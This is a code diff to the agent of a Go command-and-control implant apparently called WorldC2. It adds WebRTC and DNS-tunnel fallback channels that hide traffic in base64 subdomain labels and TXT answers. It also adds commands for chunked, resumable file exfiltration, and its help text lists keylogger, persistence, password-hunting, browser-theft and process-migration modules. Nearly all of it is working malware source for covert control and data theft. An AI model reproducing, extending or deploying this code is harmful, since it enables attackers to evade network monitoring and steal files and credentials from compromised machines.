@@ -24,6 +24,7 @@ import (
 	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
 	"github.com/Ruby570bocadito/WorldC2/src/go/internal/evasion"
 	proto "github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
+	"github.com/Ruby570bocadito/WorldC2/src/go/internal/transport"
 	protobuf "google.golang.org/protobuf/proto"
 )
 
@@ -70,6 +71,13 @@ type Agent struct {
 	// Optional mTLS client certificate (provisioned via /api/mtls/client-cert)
 	clientCert *tls.Certificate
 
+	// File exfiltration registry: transferID -> pending job (for resume)
+	exfilJobs map[string]*exfilJob
+	exfilMu   sync.Mutex
+
+	// Optional DNS transport domain (opt-in via -dns-domain)
+	dnsDomain string
+
 	// Channels
 	tasks   chan *proto.Task
 	results chan *proto.TaskResult
@@ -90,10 +98,15 @@ func New(serverAddr string) *Agent {
 		tunnels:        make(map[string]net.Conn),
 		modules:        NewModuleRegistry(),
 		dynModules:     make(map[string]*DynamicModule),
+		exfilJobs:      make(map[string]*exfilJob),
 		tasks:          make(chan *proto.Task, 256),
 		results:        make(chan *proto.TaskResult, 256),
 	}
 }
+
+// SetDNSDomain enables the DNS transport fallback for the given domain.
+// The server must be listening with the same domain in transport.dns_domains.
+func (a *Agent) SetDNSDomain(domain string) { a.dnsDomain = domain }
 
 // Run starts the agent main loop with reconnection.
 func (a *Agent) Run() error {
@@ -282,6 +295,31 @@ func (a *Agent) connect() error {
 			dial: func() (net.Conn, error) {
 				wsPort := "8446"
 				return dialWebSocket(host, wsPort, a.clientCert)
+			},
+		},
+		{
+			name: "WebRTC",
+			dial: func() (net.Conn, error) {
+				webrtcPort := "8447"
+				addr := net.JoinHostPort(host, webrtcPort)
+				// The server serves signaling over TLS whenever tls.enabled
+				// (independent of mTLS). Try HTTPS first, then plaintext, so
+				// the transport works in both postures.
+				conn, err := transport.DialWebRTC(addr, true)
+				if err == nil {
+					return conn, nil
+				}
+				return transport.DialWebRTC(addr, false)
+			},
+		},
+		{
+			name: "DNS",
+			dial: func() (net.Conn, error) {
+				if a.dnsDomain == "" {
+					return nil, fmt.Errorf("DNS transport disabled (start the agent with -dns-domain <domain>)")
+				}
+				dnsPort := "8444"
+				return dialDNS(net.JoinHostPort(host, dnsPort), a.dnsDomain)
 			},
 		},
 	}
@@ -510,74 +548,153 @@ func dialWebSocket(host, port string, clientCert *tls.Certificate) (net.Conn, er
 // --- DNS Transport ---
 
 // dnsConn implements net.Conn for DNS tunneling.
+//
+// A dedicated reader goroutine consumes every UDP answer so downlink data
+// piggybacking on the responses to UPSTREAM data queries is never lost (each
+// response drains one entry of the server's down-queue; if only the idle
+// polls consumed them, a large upload would silently swallow queued
+// downstream bytes and corrupt the C2 stream). Read() polls with empty
+// queries when there is nothing queued and tolerates long idle periods —
+// the server sends nothing spontaneously, so a short poll window would tear
+// down and reconnect the session every couple of seconds.
 type dnsConn struct {
 	conn      *net.UDPConn
 	server    *net.UDPAddr
 	domain    string
 	sessionID string
-	upBuf     []byte
-	downBuf   []byte
-	upOff     int
-	downOff   int
+
+	mu      sync.Mutex
+	downBuf []byte // received downlink bytes not yet handed to Read
+	downOff int    // consumed prefix of downBuf
+
+	gotData   chan struct{} // buffered(1): downlink data became available
+	closed    chan struct{}
+	closeOnce sync.Once
+}
+
+const (
+	dnsPollInterval = 250 * time.Millisecond
+	dnsIdleWindow   = 5 * time.Minute // same idle bound as the server side
+)
+
+// readLoop consumes UDP answers until the socket is closed.
+func (c *dnsConn) readLoop() {
+	defer c.shutdown()
+	resp := make([]byte, 65535) // TXT answers can exceed the classic 512B UDP size
+	for {
+		n, _, err := c.conn.ReadFromUDP(resp)
+		if err != nil {
+			return
+		}
+		data := extractDNSTXTData(resp[:n])
+		if len(data) == 0 {
+			continue
+		}
+		c.mu.Lock()
+		if c.downOff > 0 {
+			c.downBuf = append([]byte(nil), c.downBuf[c.downOff:]...)
+			c.downOff = 0
+		}
+		c.downBuf = append(c.downBuf, data...)
+		c.mu.Unlock()
+		select {
+		case c.gotData <- struct{}{}:
+		default:
+		}
+	}
+}
+
+func (c *dnsConn) shutdown() {
+	c.closeOnce.Do(func() {
+		close(c.closed)
+		c.conn.Close()
+	})
 }
 
 func (c *dnsConn) Read(b []byte) (int, error) {
-	// Read from down buffer first
-	if c.downOff < len(c.downBuf) {
-		n := copy(b, c.downBuf[c.downOff:])
-		c.downOff += n
-		return n, nil
+	deadline := time.Now().Add(dnsIdleWindow)
+	for {
+		c.mu.Lock()
+		if c.downOff < len(c.downBuf) {
+			n := copy(b, c.downBuf[c.downOff:])
+			c.downOff += n
+			c.mu.Unlock()
+			return n, nil
+		}
+		c.mu.Unlock()
+
+		// Nothing queued: send an empty poll query. The answer (and any
+		// downlink data queued just after it) is consumed by readLoop.
+		if _, err := c.conn.Write(buildDNSQuery(c.sessionID, c.domain, []byte{})); err != nil {
+			return 0, err
+		}
+
+		select {
+		case <-c.closed:
+			return 0, fmt.Errorf("dns connection closed")
+		case <-c.gotData:
+			// Data appended by readLoop — retry the copy above.
+		case <-time.After(dnsPollInterval):
+			if time.Now().After(deadline) {
+				return 0, fmt.Errorf("dns read timeout (no downstream data for %v)", dnsIdleWindow)
+			}
+		}
 	}
-
-	// Send query with empty data to get response
-	query := buildDNSQuery(c.sessionID, c.domain, []byte{})
-	if _, err := c.conn.WriteToUDP(query, c.server); err != nil {
-		return 0, err
-	}
-
-	// Read response
-	resp := make([]byte, 512)
-	n, _, err := c.conn.ReadFromUDP(resp)
-	if err != nil {
-		return 0, err
-	}
-
-	// Extract TXT record data
-	data := extractDNSTXTData(resp[:n])
-	c.downBuf = data
-	c.downOff = 0
-
-	if len(data) == 0 {
-		return 0, fmt.Errorf("dns read timeout")
-	}
-
-	m := copy(b, data)
-	c.downOff = m
-	return m, nil
 }
 
 func (c *dnsConn) Write(b []byte) (int, error) {
-	query := buildDNSQuery(c.sessionID, c.domain, b)
-	return c.conn.WriteToUDP(query, c.server)
+	// The query name caps how much data fits in one DNS packet; larger
+	// writes are split into sequenced queries (the C2 framing reads them
+	// back in order).
+	maxPayload := maxDNSPayload(len(c.domain))
+	if maxPayload < 32 {
+		maxPayload = 32
+	}
+	total := 0
+	for total < len(b) {
+		end := total + maxPayload
+		if end > len(b) {
+			end = len(b)
+		}
+		query := buildDNSQuery(c.sessionID, c.domain, b[total:end])
+		if _, err := c.conn.Write(query); err != nil {
+			return total, err
+		}
+		total = end
+	}
+	return total, nil
 }
 
-func (c *dnsConn) Close() error { return c.conn.Close() }
+func (c *dnsConn) Close() error {
+	c.shutdown()
+	return nil
+}
 func (c *dnsConn) LocalAddr() net.Addr {
 	return &net.UDPAddr{IP: net.IPv4zero, Port: 0}
 }
 func (c *dnsConn) RemoteAddr() net.Addr { return c.server }
-func (c *dnsConn) SetDeadline(t time.Time) error {
-	return c.conn.SetDeadline(t)
-}
-func (c *dnsConn) SetReadDeadline(t time.Time) error {
-	return c.conn.SetReadDeadline(t)
-}
-func (c *dnsConn) SetWriteDeadline(t time.Time) error {
-	return c.conn.SetWriteDeadline(t)
-}
+
+// Deadlines: the socket belongs to the reader goroutine, so per-op deadlines
+// cannot be honoured by Read/Write directly. The poll loop above provides the
+// idle bound instead.
+func (c *dnsConn) SetDeadline(t time.Time) error      { return nil }
+func (c *dnsConn) SetReadDeadline(t time.Time) error  { return nil }
+func (c *dnsConn) SetWriteDeadline(t time.Time) error { return nil }
+
+// maxDNSDomainLen caps the tunnel domain so the shortest possible query
+// (session label + one payload label + domain) still fits in a DNS name
+// instead of silently producing a corrupt wire name.
+const maxDNSDomainLen = dnsNameLimit - 11
 
 // dialDNS establishes a DNS tunnel connection.
 func dialDNS(serverAddr, domain string) (net.Conn, error) {
+	if domain == "" {
+		return nil, fmt.Errorf("dns tunnel: empty domain")
+	}
+	if len(domain) > maxDNSDomainLen {
+		return nil, fmt.Errorf("dns tunnel: domain too long (%d chars, max %d)", len(domain), maxDNSDomainLen)
+	}
+
 	server, err := net.ResolveUDPAddr("udp", serverAddr)
 	if err != nil {
 		return nil, err
@@ -590,21 +707,53 @@ func dialDNS(serverAddr, domain string) (net.Conn, error) {
 
 	sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(time.Now().String())))[:16]
 
-	return &dnsConn{
+	c := &dnsConn{
 		conn:      conn,
 		server:    server,
 		domain:    domain,
 		sessionID: sessionID,
-	}, nil
+		gotData:   make(chan struct{}, 1),
+		closed:    make(chan struct{}),
+	}
+	go c.readLoop()
+	return c, nil
+}
+
+const (
+	dnsLabelMax  = 48  // payload label size: multiple of 4 so base64 groups never straddle labels (< 63)
+	dnsNameLimit = 253 // RFC 1035 max wire length of a domain name
+)
+
+// maxDNSPayload computes how many payload bytes fit in one query name:
+// "<sess8>.<l1>.<l2>...<domain>." must stay under dnsNameLimit.
+func maxDNSPayload(domainLen int) int {
+	// Overhead: sess label (8+1) + domain (len+1) + terminating zero
+	available := dnsNameLimit - 9 - domainLen - 2
+	labels := available / (dnsLabelMax + 1)
+	if labels < 1 {
+		labels = 1
+	}
+	// RawURL base64 encodes 3 bytes into 4 chars.
+	return labels * dnsLabelMax / 4 * 3
 }
 
 func buildDNSQuery(sessionID, domain string, data []byte) []byte {
-	// Encode data as base64 subdomain labels
-	encoded := base64.URLEncoding.EncodeToString(data)
-	encoded = strings.ReplaceAll(encoded, "=", "")
+	// Encode data as unpadded URL-safe base64 split across labels.
+	encoded := base64.RawURLEncoding.EncodeToString(data)
 
-	// Build query name: session.data.domain.
-	qname := fmt.Sprintf("%s.%s.%s.", sessionID[:8], encoded[:minInt(len(encoded), 50)], domain)
+	var sb strings.Builder
+	sb.WriteString(sessionID[:8])
+	for i := 0; i < len(encoded); i += dnsLabelMax {
+		end := i + dnsLabelMax
+		if end > len(encoded) {
+			end = len(encoded)
+		}
+		sb.WriteByte('.')
+		sb.WriteString(encoded[i:end])
+	}
+	sb.WriteByte('.')
+	sb.WriteString(domain)
+	qname := sb.String()
 
 	// Build DNS query header
 	buf := make([]byte, 0, 64+len(qname))
@@ -673,13 +822,19 @@ func extractDNSTXTData(resp []byte) []byte {
 		rdlength := int(resp[offset+8])<<8 | int(resp[offset+9])
 
 		if rtype == 16 && offset+10+rdlength <= len(resp) { // TXT
-			// TXT data starts at offset+10
+			// TXT data: sequence of <len-byte><string> character-strings.
 			txtData := resp[offset+10 : offset+10+rdlength]
-			// Skip length byte(s)
-			if len(txtData) > 0 {
-				return txtData[1:]
+			var out []byte
+			for pos := 0; pos < len(txtData); {
+				l := int(txtData[pos])
+				pos++
+				if pos+l > len(txtData) {
+					break
+				}
+				out = append(out, txtData[pos:pos+l]...)
+				pos += l
 			}
-			return txtData
+			return out
 		}
 
 		offset += 10 + rdlength
@@ -921,6 +1076,17 @@ func (a *Agent) executeTask(task *proto.Task) *proto.TaskResult {
 		return a.handleModuleLoad(cmd)
 	}
 
+	// File exfiltration (chunked, resumable)
+	if strings.HasPrefix(cmd, "exfil:") {
+		return a.handleExfilSend(task, strings.TrimPrefix(cmd, "exfil:"))
+	}
+	if strings.HasPrefix(cmd, "exfil_find:") {
+		return a.handleExfilFind(task, strings.TrimPrefix(cmd, "exfil_find:"))
+	}
+	if strings.HasPrefix(cmd, "__exfil_resume ") {
+		return a.handleExfilResume(task, strings.TrimPrefix(cmd, "__exfil_resume "))
+	}
+
 	// Dynamic module commands
 	if dm := a.findDynamicModuleCommand(cmd); dm != nil {
 		return dm(cmd)
@@ -945,7 +1111,7 @@ func (a *Agent) executeTask(task *proto.Task) *proto.TaskResult {
 		list := a.modules.List()
 		return &proto.TaskResult{
 			TaskId:  task.TaskId,
-			Output:  fmt.Sprintf("Available modules: %v\n\nUse: keylogger, screenshot, persistence, ps, sysinfo, netinfo, find:pattern, clipboard, passhunt, browser, watch:interval, migrate:pid", list),
+			Output:  fmt.Sprintf("Available modules: %v\n\nUse: keylogger, screenshot, persistence, ps, sysinfo, netinfo, find:pattern, clipboard, passhunt, browser, watch:interval, migrate:pid\nExfiltration: exfil:<path> (file or dir, resumable), exfil_find:<root>|<pattern>", list),
 			Success: true,
 		}
 	}
